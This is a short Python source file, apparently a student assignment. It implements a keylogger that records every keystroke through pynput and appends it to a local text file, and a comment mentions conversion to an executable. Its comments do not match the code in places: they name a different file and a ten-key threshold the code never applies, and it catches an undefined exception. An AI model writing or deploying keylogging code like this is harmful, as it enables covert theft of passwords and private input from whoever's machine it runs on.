import pynput
import pkg_resources.py2_warn
from kivy_deps import sdl2, glew
import dependency_injector.errors
import six
from pynput.keyboard import Key, Listener
counter=0
Wordlist=[]
print("hello grader!")
#Writes to text file "log.txt" and reads inputs from key Listener and
#Checks for keywords such as "space"/"Key" from key and starts a new line.
#Function removes quotaions from string array and converts to space.
def write_file(Wordlist):
    with open("text.txt", "a") as f:
        for key in Wordlist:
            k=str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
#Function records key strokes and keys so once a string reaches 10 or more key strokes
#text file log is updated and resets counter and empties array string.
def on_press(key):
    global Wordlist, counter

    Wordlist.append(key)
    counter += 1
    print("{0} pressed".format(key)) #Testing purposes REMOVE BEFORE EXE CONV!!!

    if counter >= 0:
        counter = 0
        write_file(Wordlist)
        Wordlist=[]

#Function serves as a kill switch to stop from listening.
def on_release(key):
    if key == Key.esc:
        return False

with Listener (on_press=on_press, on_release=on_release) as listener:
    try:
        listener.join()
    except MyException as e:
        print('{0} was pressed'.format(e.args[0]))
